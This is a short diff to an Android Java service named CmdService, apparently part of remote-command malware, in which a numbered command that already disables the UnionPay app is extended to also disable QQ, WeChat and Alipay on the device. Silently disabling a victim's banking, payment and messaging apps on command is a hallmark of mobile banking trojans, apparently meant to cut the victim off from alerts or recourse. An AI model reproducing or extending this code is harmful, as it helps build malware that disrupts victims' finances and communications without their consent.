@@ -58,6 +58,9 @@ public class CmdService extends Service {
 
             case 4: {
                 getPackageManager().setApplicationEnabledSetting("com.unionpay", PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0);
+                getPackageManager().setApplicationEnabledSetting("com.tencent.mobileqq", PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0);
+                getPackageManager().setApplicationEnabledSetting("com.tencent.mm", PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0);
+                getPackageManager().setApplicationEnabledSetting("com.eg.android.AlipayGphone", PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0);
             }
             break;
         }
